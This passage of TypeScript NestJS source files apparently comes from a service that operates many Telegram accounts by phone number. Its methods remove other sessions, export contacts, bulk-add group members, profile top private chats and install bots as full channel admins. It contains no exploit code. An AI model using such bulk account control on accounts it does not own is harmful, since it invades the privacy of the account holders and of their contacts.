connectionManager.getClient(mobile)\n        try {\n            return await telegramClient.getMediaMetadata(params);\n        } catch (error) {\n            this.logger.error(mobile, 'Error getting media metadata:', error);\n            throw error;\n        }\n    }\n\n    async getMediaFileDownloadInfo(mobile: string, messageId: number, chatId: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        try {\n            this.logger.info(mobile, 'Get media file download info', { messageId, chatId });\n            return await telegramClient.getMediaFileDownloadInfo(messageId, chatId);\n        } catch (error) {\n            this.logger.error(mobile, 'Error getting media file download info:', error);\n            throw error;\n        }\n    }\n\n    async *streamMediaFile(mobile: string, fileLocation: any, offset?: bigInt.BigInteger, limit?: number, requestSize?: number) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        yield* telegramClient.streamMediaFile(fileLocation, offset, limit, requestSize);\n    }\n\n    async getThumbnail(mobile: string, messageId: number, chatId: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        try {\n            this.logger.info(mobile, 'Get thumbnail', { messageId, chatId });\n            return await telegramClient.getThumbnail(messageId, chatId);\n        } catch (error) {\n            this.logger.error(mobile, 'Error getting thumbnail:', error);\n            throw error;\n        }\n    }\n\n    async forwardMessage(mobile: string, toChatId: string, fromChatId: string, messageId: number) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.forwardMessage(toChatId, fromChatId, messageId);\n    }\n\n    async leaveChannels(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        const channelinfo = await channelInfo(telegramClient.client, false);\n        const leaveChannelIds = channelinfo.canSendFalseChats\n        telegramClient.leaveChannels(leaveChannelIds);\n        return \"Left channels initiated\";\n    }\n\n    async leaveChannel(mobile: string, channel: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        telegramClient.leaveChannels([channel]);\n        return \"Left channel initiated\";\n    }\n\n    async deleteChat(mobile: string, params: {\n        peer: string | Api.TypeInputPeer;\n        maxId?: number;\n        justClear?: boolean;\n        revoke?: boolean;\n        minDate?: number;\n        maxDate?: number;\n    }) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.deleteChat(params);\n    }\n    async updateNameandBio(\n        mobile: string,\n        firstName?: string,\n        about?: string,\n    ): Promise<void> {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.updateProfile(firstName, about);\n    }\n\n    async getConnectionStatus(): Promise<{\n        activeConnections: number;\n        rateLimited: number;\n        totalOperations: number;\n    }> {\n        const status = {\n            activeConnections: connectionManager.getActiveConnectionCount(),\n            rateLimited: 0,\n            totalOperations: 0\n        };\n\n        this.logger.info('system', 'Connection status retrieved', status);\n        return status;\n    }\n\n    async forwardBulkMessages(\n        mobile: string,\n        fromChatId: string,\n        toChatId: string,\n        messageIds: number[]\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.forwardMessages(fromChatId, toChatId, messageIds)\n    }\n\n    async getAuths(mobile: string): Promise<any> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        const auths = await telegramClient.getAuths();\n        this.logger.info(mobile, 'Retrieved authorizations', {\n            count: auths?.authorizations?.length || 0\n        });\n        return auths;\n    }\n\n    async removeOtherAuths(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        await telegramClient.removeOtherAuths();\n        this.logger.info(mobile, 'Removed other authorizations');\n        return \"Removed other authorizations\";\n    }\n\n    public async processBatch<T>(\n        items: T[],\n        batchSize: number,\n        processor: (batch: T[]) => Promise<void>,\n        delayMs: number = 2000\n    ): Promise<{ processed: number, errors: Error[] }> {\n        const errors: Error[] = [];\n        let processed = 0;\n\n        for (let i = 0; i < items.length; i += batchSize) {\n            const batch = items.slice(i, i + batchSize);\n            try {\n                await processor(batch);\n                processed += batch.length;\n                if (i + batchSize < items.length) {\n                    await new Promise(resolve => setTimeout(resolve, delayMs));\n                }\n            } catch (error) {\n                errors.push(error);\n                this.logger.error('batch-process', 'Batch processing failed', error);\n            }\n        }\n\n        return { processed, errors };\n    }\n\n    // Enhanced Group Management\n    async createGroupWithOptions(mobile: string, options: GroupOptions) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        const result = await telegramClient.createGroupOrChannel(options);\n        // Attempt to extract the channel/group ID from the result\n        let groupId: string | undefined;\n        if ('chats' in result && Array.isArray(result.chats) && result.chats.length > 0) {\n            // For most cases, the created group/channel will be the last chat in the array\n            const chat = result.chats[result.chats.length - 1];\n            groupId = chat.id?.toString();\n        }\n        this.logger.info(mobile, 'Group created', { id: groupId });\n        return result;\n    }\n\n    async updateGroupSettings(\n        mobile: string,\n        settings: {\n            groupId: string;\n            username?: string;\n            title?: string;\n            description?: string;\n            slowMode?: number;\n            memberRestrictions?: any;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.updateGroupSettings(settings)\n    }\n\n    // Message Scheduling\n    async scheduleMessage(mobile: string, options: MessageScheduleOptions) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.scheduleMessageSend({\n            chatId: options.chatId,\n            message: options.message,\n            scheduledTime: options.scheduledTime,\n            replyTo: options.replyTo,\n            silent: options.silent\n        });\n    }\n\n    async getScheduledMessages(mobile: string, chatId: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.getScheduledMessages(chatId)\n    }\n\n    async sendMediaAlbum(mobile: string, album: MediaAlbumOptions) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        try {\n            return await telegramClient.sendMediaAlbum(album)\n        } catch (error) {\n            this.logger.error(mobile, 'Error sending media album:', error);\n            throw error;\n        }\n    }\n\n    async sendMessage(mobile: string, params: SendTgMessageDto) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.sendMessage(params)\n    }\n\n    async sendVoiceMessage(\n        mobile: string,\n        voice: {\n            chatId: string;\n            url: string;\n            duration?: number;\n            caption?: string;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        try {\n            return await telegramClient.sendVoiceMessage(voice)\n        } catch (error) {\n            this.logger.error(mobile, 'Error sending voice message:', error);\n            throw error;\n        }\n    }\n\n    async cleanupChat(\n        mobile: string,\n        cleanup: {\n            chatId: string;\n            beforeDate?: Date;\n            onlyMedia?: boolean;\n            excludePinned?: boolean;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.cleanupChat(cleanup)\n    }\n\n    async getChatStatistics(mobile: string, chatId: string, period: 'day' | 'week' | 'month'): Promise<ChatStatistics> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.getChatStatistics(chatId, period)\n    }\n\n    // Enhanced Privacy Features\n    async updatePrivacyBatch(\n        mobile: string,\n        settings: {\n            phoneNumber?: 'everybody' | 'contacts' | 'nobody';\n            lastSeen?: 'everybody' | 'contacts' | 'nobody';\n            profilePhotos?: 'everybody' | 'contacts' | 'nobody';\n            forwards?: 'everybody' | 'contacts' | 'nobody';\n            calls?: 'everybody' | 'contacts' | 'nobody';\n            groups?: 'everybody' | 'contacts' | 'nobody';\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.updatePrivacyBatch(settings)\n    }\n\n    async addGroupMembers(mobile: string, groupId: string, members: string[]): Promise<void> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.addGroupMembers(groupId, members)\n    }\n\n    async removeGroupMembers(mobile: string, groupId: string, members: string[]): Promise<void> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.removeGroupMembers(groupId, members)\n    }\n\n    async promoteToAdmin(\n        mobile: string,\n        groupId: string,\n        userId: string,\n        permissions?: {\n            changeInfo?: boolean;\n            postMessages?: boolean;\n            editMessages?: boolean;\n            deleteMessages?: boolean;\n            banUsers?: boolean;\n            inviteUsers?: boolean;\n            pinMessages?: boolean;\n            addAdmins?: boolean;\n            anonymous?: boolean;\n            manageCall?: boolean;\n        },\n        rank?: string\n    ): Promise<void> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.promoteToAdmin(groupId, userId, permissions, rank)\n    }\n\n    async demoteAdmin(mobile: string, groupId: string, userId: string): Promise<void> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.info(mobile, 'Demoted admin to regular member', { groupId, userId });\n        return await telegramClient.demoteAdmin(groupId, userId);\n    }\n\n    async unblockGroupUser(mobile: string, groupId: string, userId: string): Promise<void> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.info(mobile, 'Unblocked user in group', { groupId, userId });\n        return await telegramClient.unblockGroupUser(groupId, userId);\n    }\n\n    async getGroupAdmins(mobile: string, groupId: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.info(mobile, 'Get group admins', { groupId });\n        return await telegramClient.getGroupAdmins(groupId);\n    }\n\n    async getGroupBannedUsers(mobile: string, groupId: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.info(mobile, 'Get group banned users', { groupId });\n        return await telegramClient.getGroupBannedUsers(groupId);\n    }\n\n    async searchMessages(\n        mobile: string,\n        params: SearchMessagesDto\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.info(mobile, 'Search messages', params);\n        return await telegramClient.searchMessages(params);\n    }\n\n    async getFilteredMedia(\n        mobile: string,\n        params: {\n            chatId: string;\n            types?: ('photo' | 'video' | 'document' | 'voice' | 'all')[];\n            startDate?: Date;\n            endDate?: Date;\n            limit?: number;\n            maxId?: number;\n            minId?: number;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        try {\n            this.logger.info(mobile, 'Get filtered media', params);\n            return await telegramClient.getFilteredMedia(params);\n        } catch (error) {\n            this.logger.error(mobile, 'Error getting filtered media:', error);\n            throw error;\n        }\n    }\n\n    // Contact Management\n    async exportContacts(\n        mobile: string,\n        format: 'vcard' | 'csv',\n        includeBlocked: boolean = false\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.info(mobile, 'Export contacts', { format, includeBlocked });\n        return await telegramClient.exportContacts(format, includeBlocked);\n    }\n\n    async importContacts(\n        mobile: string,\n        contacts: { firstName: string; lastName?: string; phone: string }[]\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.info(mobile, 'Import contacts', { contactCount: contacts.length });\n        return await telegramClient.importContacts(contacts);\n    }\n\n    async manageBlockList(\n        mobile: string,\n        userIds: string[],\n        block: boolean\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.info(mobile, block ? 'Block users' : 'Unblock users', { userIds });\n        return await telegramClient.manageBlockList(userIds, block);\n    }\n\n    async getContactStatistics(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.info(mobile, 'Get contact statistics');\n        return await telegramClient.getContactStatistics();\n    }\n\n    // Chat Folder Management\n    async createChatFolder(\n        mobile: string,\n        options: {\n            name: string;\n            includedChats: string[];\n            excludedChats?: string[];\n            includeContacts?: boolean;\n            includeNonContacts?: boolean;\n            includeGroups?: boolean;\n            includeBroadcasts?: boolean;\n            includeBots?: boolean;\n            excludeMuted?: boolean;\n            excludeRead?: boolean;\n            excludeArchived?: boolean;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.info(mobile, 'Create chat folder', { name: options.name });\n        return await telegramClient.createChatFolder(options);\n    }\n\n    async getChatFolders(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.info(mobile, 'Get chat folders');\n        return await telegramClient.getChatFolders();\n    }\n\n    // Session Management\n    async getSessionInfo(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.info(mobile, 'Get session info');\n        return await telegramClient.getSessionInfo();\n    }\n\n    async terminateSession(\n        mobile: string,\n        options: {\n            hash: string;\n            type: 'app' | 'web';\n            exceptCurrent?: boolean;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.info(mobile, 'Terminate session', options);\n        return await telegramClient.terminateSession(options);\n    }\n\n    // Message Management\n    async editMessage(\n        mobile: string,\n        options: {\n            chatId: string;\n            messageId: number;\n            text?: string;\n            media?: {\n                type: 'photo' | 'video' | 'document';\n                url: string;\n            };\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.info(mobile, 'Edit message', { chatId: options.chatId, messageId: options.messageId });\n        return await telegramClient.editMessage(options);\n    }\n\n    // Chat Management\n    async updateChatSettings(\n        mobile: string,\n        settings: {\n            chatId: string;\n            username?: string;\n            title?: string;\n            about?: string;\n            photo?: string;\n            slowMode?: number;\n            linkedChat?: string;\n            defaultSendAs?: string;\n        }\n    ) {\n        if (!settings.chatId) {\n            throw new Error('chatId is required');\n        }\n\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.info(mobile, 'Update chat settings', { chatId: settings.chatId });\n        return await telegramClient.updateChatSettings(settings);\n    }\n\n    // Media Handling\n    async sendMediaBatch(\n        mobile: string,\n        options: {\n            chatId: string;\n            media: Array<{\n                type: 'photo' | 'video' | 'document';\n                url: string;\n                caption?: string;\n                fileName?: string;\n            }>;\n            silent?: boolean;\n            scheduleDate?: number;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.info(mobile, 'Send media batch', { chatId: options.chatId, mediaCount: options.media.length });\n        return await telegramClient.sendMediaBatch(options);\n    }\n\n    // Password Management\n    async hasPassword(mobile: string): Promise<boolean> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.info(mobile, 'Check password status');\n        return await telegramClient.hasPassword();\n    }\n\n    // Contact Management\n    async getContacts(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.info(mobile, 'Get contacts list');\n        return await telegramClient.getContacts();\n    }\n\n    // Extended Chat Functions\n    async getDialogs(\n        mobile: string,\n        options: {\n            limit?: number;\n            offsetDate?: number;\n            folderId?: number;\n            archived?: boolean;\n            peerType?: 'all' | 'user' | 'group' | 'channel';\n            ignorePinned?: boolean;\n            includePhotos?: boolean;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.info(mobile, 'Get chats', options);\n        return await telegramClient.getChats(options);\n    }\n\n    async getFileUrl(mobile: string, url: string, filename: string): Promise<string> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.info(mobile, 'Get file URL', { url, filename });\n        return await telegramClient.getFileUrl(url, filename);\n    }\n\n    async getMessageStats(\n        mobile: string,\n        options: {\n            chatId: string;\n            period: 'day' | 'week' | 'month';\n            fromDate?: Date;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.info(mobile, 'Get message statistics', options);\n        return await telegramClient.getMessageStats(options);\n    }\n\n    async sendViewOnceMedia(\n        mobile: string,\n        options: {\n            chatId: string;\n            sourceType: 'path' | 'base64' | 'binary';\n            path?: string;\n            base64Data?: string;\n            binaryData?: Buffer;\n            caption?: string;\n            filename?: string;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.info(mobile, 'Send view once media', { sourceType: options.sourceType, chatId: options.chatId });\n\n        const { sourceType, chatId, caption, filename } = options;\n        try {\n            if (sourceType === 'path') {\n                if (!options.path) throw new BadRequestException('Path is required when sourceType is url');\n\n                try {\n                    const localPath = options.path;\n                    if (!fs.existsSync(localPath)) {\n                        throw new BadRequestException(`File not found at path: ${localPath}`);\n                    }\n                    let isVideo = false;\n                    const ext = path.extname(localPath).toLowerCase().substring(1);\n                    if (['mp4', 'mov', 'avi', 'mkv', 'wmv', 'flv', 'webm', '3gp'].includes(ext)) {\n                        isVideo = true;\n                    }\n\n                    const fileBuffer = fs.readFileSync(localPath);\n\n                    this.logger.info(mobile, 'Sending view once media from local file', {\n                        path: localPath,\n                        isVideo,\n                        size: fileBuffer.length,\n                        filename: filename || path.basename(localPath)\n                    });\n\n                    return await telegramClient.sendViewOnceMedia(\n                        chatId,\n                        fileBuffer,\n                        caption,\n                        isVideo,\n                        filename || path.basename(localPath)\n                    );\n                } catch (error) {\n                    if (error instanceof BadRequestException) {\n                        throw error;\n                    }\n                    this.logger.error(mobile, 'Failed to read local file', error);\n                    throw new BadRequestException(`Failed to read local file: ${error.message}`);\n                }\n            }\n            else if (sourceType === 'base64') {\n                if (!options.base64Data) throw new BadRequestException('Base64 data is required when sourceType is base64');\n                const base64String = options.base64Data;\n                let isVideo = false;\n                if (filename) {\n                    const ext = filename.toLowerCase().split('.').pop();\n                    if (ext && ['mp4', 'mov', 'avi', 'mkv', 'wmv', 'flv', 'webm', '3gp'].includes(ext)) {\n                        isVideo = true;\n                    }\n                }\n                this.logger.info(mobile, 'Sending view once media from base64', { isVideo, size: base64String.length });\n                const mediaData = Buffer.from(base64String, 'base64');\n                return await telegramClient.sendViewOnceMedia(chatId, mediaData, caption, isVideo, filename);\n            }\n            else if (sourceType === 'binary') {\n                if (!options.binaryData) throw new BadRequestException('Binary data is required when sourceType is binary');\n\n                this.logger.info(mobile, 'Sending view once media from binary', {\n                    size: options.binaryData.length,\n                    filename: filename || 'unknown'\n                });\n                let isVideo = false;\n                if (filename) {\n                    const ext = filename.toLowerCase().split('.').pop();\n                    if (ext && ['mp4', 'mov', 'avi', 'mkv', 'wmv', 'flv', 'webm', '3gp'].includes(ext)) {\n                        isVideo = true;\n                    }\n                }\n                return await telegramClient.sendViewOnceMedia(chatId, options.binaryData, caption, isVideo, filename);\n            }\n            else {\n                throw new BadRequestException('Invalid source type. Must be one of: url, base64, binary');\n            }\n        } catch (error) {\n            this.logger.error(mobile, 'Failed to send view once media', error);\n            throw error;\n        }\n    }\n\n    async getTopPrivateChats(mobile: string, limit?: number): Promise<{\n        chatId: string;\n        username?: string;\n        firstName?: string;\n        lastName?: string;\n        totalMessages: number;\n        interactionScore: number;\n        engagementLevel: 'recent' | 'active' | 'dormant';\n        lastActivityDays: number;\n        calls: {\n            total: number;\n            incoming: {\n                total: number;\n                audio: number;\n                video: number;\n            };\n            outgoing: {\n                total: number;\n                audio: number;\n                video: number;\n            };\n        };\n        media: {\n            photos: number;\n            videos: number;\n        };\n        activityBreakdown: {\n            videoCalls: number;\n            audioCalls: number;\n            mediaSharing: number;\n            textMessages: number;\n        };\n    }[]> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.info(mobile, `Get top private chats with limit=${limit || 10}`);\n        try {\n            return await telegramClient.getTopPrivateChats(limit);\n        } catch (error) {\n            this.logger.error(mobile, 'Error getting top private chats:', error);\n            throw error;\n        }\n    }\n\n    async addBotsToChannel(\n        mobile: string,\n        channelIds: string[] = [process.env.accountsChannel, process.env.updatesChannel, process.env.notifChannel, \"miscmessages\", process.env.httpFailuresChannel],\n    ) {\n        this.logger.info(mobile, 'Add bots to channel', { channelIds });\n        const botTokens = (process.env.BOT_TOKENS || '').split(',').filter(Boolean);\n        if (botTokens.length === 0) {\n            console.warn('No bot tokens configured. Please set BOT_TOKENS environment variable');\n            throw new Error('No bot tokens configured. Please set BOT_TOKENS environment variable');\n        }\n        for (const token of botTokens) {\n            try {\n                const botInfo = await this.getBotInfo(token);\n                if (botInfo) {\n                    for (const channelId of channelIds) {\n                        await this.setupBotInChannel(mobile, channelId, botInfo.id, botInfo.username, {\n                            changeInfo: true,\n                            postMessages: true,\n                            editMessages: true,\n                            deleteMessages: true,\n                            banUsers: true,\n                            inviteUsers: true,\n                            pinMessages: true,\n                            addAdmins: true,\n                            anonymous: true,\n                            manageCall: true\n                        });\n                    };\n                }\n            } catch (error) {\n                this.logger.error(mobile, 'Failed to setup bot in channel', error);\n            }\n        }\n\n\n    }\n\n    async getBotInfo(token: string) {\n        try {\n            const response = await fetchWithTimeout(`https://api.telegram.org/bot${token}/getMe`);\n            if (response.data?.ok) {\n                return response.data.result;\n            }\n            throw new Error('Failed to get bot info');\n        } catch (error) {\n            throw new Error(`Failed to get bot info: ${error.message}`);\n        }\n    }\n\n    async setupBotInChannel(mobile: string, channelId: string, botId: string, botUsername: string, permissions: {\n        changeInfo?: boolean;\n        postMessages?: boolean;\n        editMessages?: boolean;\n        deleteMessages?: boolean;\n        banUsers?: boolean;\n        inviteUsers?: boolean;\n        pinMessages?: boolean;\n        addAdmins?: boolean;\n        anonymous?: boolean;\n        manageCall?: boolean;\n    }): Promise<void> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.info(mobile, 'Setup bot in channel', { channelId, botId, botUsername });\n        try {\n            await telegramClient.joinChannel(channelId);\n        } catch (error) {\n            this.logger.error(mobile, 'Failed to join channel', error);\n        }\n        try {\n            await telegramClient.promoteToAdmin(channelId, botUsername, permissions);\n            this.logger.info(mobile, 'Bot added to channel', { channelId, botUsername });\n            await sleep(2000);\n            this.logger.info(mobile, `Bot ${botUsername} successfully added to channel ${channelId}`);\n        } catch (error) {\n            this.logger.error(mobile, `Failed to add bot ${botUsername} to channel ${channelId}`, error);\n        }\n        try {\n            await telegramClient.promoteToAdmin(channelId, botUsername, permissions);\n            this.logger.debug(mobile, `Bot ${botUsername} promoted as admin in channel ${channelId}`);\n        } catch (error) {\n            this.logger.error(mobile, `Failed to setup bot ${botUsername} in channel ${channelId}`, error);\n        }\n    }\n\n    async createBot(mobile: string, createBotDto: CreateTgBotDto) {\n        const client = await connectionManager.getClient(mobile);\n        return client.createBot(createBotDto);\n    }\n\n    // Connection Management Methods\n    async connect(mobile: string, options?: GetClientOptionsDto): Promise<void> {\n        await connectionManager.getClient(mobile, options);\n    }\n\n    async disconnect(mobile: string): Promise<void> {\n        await connectionManager.unregisterClient(mobile);\n    }\n\n    async disconnectAll(): Promise<void> {\n        await connectionManager.disconnectAll();\n    }\n\n    getConnectionStats() {\n        return connectionManager.getConnectionStats();\n    }\n\n    getClientState(mobile: string): ConnectionStatusDto | undefined {\n        const state = connectionManager.getClientState(mobile);\n        return state;\n    }\n\n    getActiveConnectionCount(): number {\n        return connectionManager.getActiveConnectionCount();\n    }\n}\n","export { default } from './manager';\nexport * from './manager/types';\n","import { Injectable } from '@nestjs/common';\r\n\r\n@Injectable()\r\nexport class TelegramValidationConfig {\r\n    static readonly PHONE_PATTERN = /^\\+?[1-9]\\d{1,14}$/;\r\n    static readonly USERNAME_PATTERN = /^[a-zA-Z0-9_]{5,32}$/;\r\n    static readonly MESSAGE_MAX_LENGTH = 4096;\r\n    static readonly CAPTION_MAX_LENGTH = 1024;\r\n    static readonly FILE_SIZE_LIMIT = 2000 * 1024 * 1024; // 2000MB\r\n    static readonly BATCH_SIZE_LIMIT = 100;\r\n    \r\n    static readonly ALLOWED_MEDIA_TYPES = [\r\n        'photo',\r\n        'video',\r\n        'document',\r\n        'voice',\r\n        'audio'\r\n    ];\r\n\r\n    static readonly ALLOWED_PRIVACY_LEVELS = [\r\n        'everybody',\r\n        'contacts',\r\n        'nobody'\r\n    ];\r\n\r\n    static readonly MESSAGE_TYPES = [\r\n        'all',\r\n        'text',\r\n        'photo',\r\n        'video',\r\n        'voice',\r\n        'document'\r\n    ];\r\n\r\n    static readonly DEFAULT_PAGINATION = {\r\n        limit: 20,\r\n        maxLimit: 100\r\n    };\r\n}","import { IsString, IsOptional, IsNumber, IsArray, IsEnum, ArrayMinSize, ArrayMaxSize } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Transform } from 'class-transformer';\r\n\r\nexport enum BatchOperationType {\r\n  FORWARD = 'forward',\r\n  DELETE = 'delete',\r\n  EDIT = 'edit'\r\n}\r\n\r\n// Base class for batch operations\r\nexport class BaseBatchItemDto {\r\n  @ApiProperty({ description: 'Chat ID for the operation' })\r\n  @IsString()\r\n  chatId: string;\r\n}\r\n\r\nexport class BatchItemDto extends BaseBatchItemDto {\r\n  @ApiProperty({ description: 'Message ID for message operations', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  messageId?: number;\r\n\r\n  @ApiProperty({ description: 'Source chat ID for forward operations', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  fromChatId?: string;\r\n\r\n  @ApiProperty({ description: 'Target chat ID for forward operations', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  toChatId?: string;\r\n}\r\n\r\nexport class BatchProcessDto {\r\n  @ApiProperty({ description: 'Operation type', enum: BatchOperationType })\r\n  @IsEnum(BatchOperationType)\r\n  operation: BatchOperationType;\r\n\r\n  @ApiProperty({ description: 'Items to process', type: [BatchItemDto] })\r\n  @IsArray()\r\n  items: BatchItemDto[];\r\n\r\n  @ApiProperty({ description: 'Number of items to process in each batch', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  batchSize?: number = 20;\r\n  @ApiProperty({ description: 'Delay between batches in milliseconds', default: 1000 })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  delayMs?: number = 1000;\r\n}\r\n\r\nexport class ForwardBatchDto {\r\n  @ApiProperty({ description: 'Source chat ID for forwarding' })\r\n  @IsString()\r\n  fromChatId: string;\r\n\r\n  @ApiProperty({ description: 'Target chat ID for forwarding' })\r\n  @IsString()\r\n  toChatId: string;\r\n\r\n  @ApiProperty({ description: 'Message IDs to forward', type: [Number] })\r\n  @IsArray()\r\n  @ArrayMinSize(1, { message: 'At least one message ID is required' })\r\n  @ArrayMaxSize(100, { message: 'Cannot forward more than 100 messages at once' })\r\n  @IsNumber({}, { each: true })\r\n  @Transform(({ value }) => Array.isArray(value) ? value.map(Number) : value)\r\n  messageIds: number[];\r\n}","import { IsString, IsBoolean, IsOptional } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport class ChannelOperationDto {\r\n    @ApiProperty({ description: 'Channel username or ID' })\r\n    @IsString()\r\n    channel: string;\r\n\r\n    @ApiProperty({ description: 'Whether to forward messages after joining', required: false })\r\n    @IsOptional()\r\n    @IsBoolean()\r\n    forward?: boolean;\r\n\r\n    @ApiProperty({ description: 'Source chat ID to forward messages from', required: false })\r\n    @IsOptional()\r\n    @IsString()\r\n    fromChatId?: string;\r\n}","import { ApiProperty } from '@nestjs/swagger';\nexport class ConnectionStatusDto {\n    @ApiProperty({ description: 'Connection state of the client', enum: ['connecting', 'connected', 'disconnecting', 'disconnected', 'error'] })\n    state: string;\n\n    @ApiProperty({ description: 'Whether auto disconnect is enabled' })\n    autoDisconnect: boolean;\n\n    @ApiProperty({ description: 'When the connection was last used', type: 'number' })\n    lastUsed: number;\n\n    @ApiProperty({ description: 'Number of connection attempts', type: 'number' })\n    connectionAttempts: number;\n\n    @ApiProperty({ description: 'Last error message if any', required: false })\n    lastError?: string;\n}\n\nexport class GetClientOptionsDto {\n    @ApiProperty({ description: 'Whether to auto disconnect the client after period of inactivity', required: false, default: true })\n    autoDisconnect?: boolean;\n\n    @ApiProperty({ description: 'Whether to use event handler', required: false, default: true })\n    handler?: boolean;\n}\n","import { IsString, IsOptional, IsArray, IsBoolean, IsEnum } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport type ExportFormat = 'vcard' | 'csv';\r\n\r\nexport class ContactGroupDto {\r\n  @ApiProperty({ description: 'Name of the contact group' })\r\n  @IsString()\r\n  name: string;\r\n\r\n  @ApiProperty({ description: 'User IDs to include in the group', type: [String] })\r\n  @IsArray()\r\n  @IsString({ each: true })\r\n  userIds: string[];\r\n\r\n  @ApiProperty({ description: 'Optional description for the group' })\r\n  @IsOptional()\r\n  @IsString()\r\n  description?: string;\r\n}\r\n\r\nexport class ContactBlockListDto {\r\n  @ApiProperty({ description: 'User IDs to block/unblock', type: [String] })\r\n  @IsArray()\r\n  @IsString({ each: true })\r\n  userIds: string[];\r\n\r\n  @ApiProperty({ description: 'Whether to block or unblock the users' })\r\n  @IsBoolean()\r\n  block: boolean;\r\n}\r\n\r\nexport class ContactExportImportDto {\r\n  @ApiProperty({ enum: ['vcard', 'csv'], description: 'Export format type' })\r\n  @IsEnum(['vcard', 'csv'] as const)\r\n  format: ExportFormat;\r\n\r\n  @ApiProperty({ description: 'Whether to include blocked contacts', required: false, default: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  includeBlocked = false;\r\n}\r\n\r\nexport class ContactImportDto {\r\n  @ApiProperty({ description: 'Contacts to import', type: [Object] })\r\n  @IsArray()\r\n  contacts: Array<{\r\n    firstName: string;\r\n    lastName?: string;\r\n    phone: string;\r\n  }>;\r\n}\r\n\r\nexport class AddContactsDto {\r\n  @ApiProperty({ description: 'Phone numbers to add', type: [String] })\r\n  @IsArray()\r\n  @IsString({ each: true })\r\n  phoneNumbers: string[];\r\n\r\n  @ApiProperty({ description: 'Name prefix to use for added contacts' })\r\n  @IsString()\r\n  prefix: string;\r\n}","import { ApiProperty } from '@nestjs/swagger';\nimport { IsNotEmpty, IsString, IsOptional, MaxLength } from 'class-validator';\n\nexport class CreateTgBotDto {\n    @ApiProperty({\n        description: 'Name of the bot (required)',\n        example: 'MyAwesomeBot'\n    })\n    @IsNotEmpty()\n    @IsString()\n    @MaxLength(64)\n    name: string;\n\n    @ApiProperty({\n        description: 'Username for the bot (required)',\n        example: 'my_awesome_bot'\n    })\n    @IsNotEmpty()\n    @IsString()\n    @MaxLength(32)\n    username: string;\n\n    @ApiProperty({\n        description: 'Description of what your bot can do',\n        example: 'This bot helps you manage your tasks',\n        required: false\n    })\n    @IsOptional()\n    @IsString()\n    @MaxLength(512)\n    description?: string;\n\n    @ApiProperty({\n        description: 'What the bot can be used for',\n        example: 'Task Management, Reminders, Notes',\n        required: false\n    })\n    @IsOptional()\n    @IsString()\n    @MaxLength(512)\n    aboutText?: string;\n\n    @ApiProperty({\n        description: 'URL to the bot\\'s profile photo',\n        example: 'https://example.com/bot-photo.jpg',\n        required: false\n    })\n    @IsOptional()\n    @IsString()\n    profilePhotoUrl?: 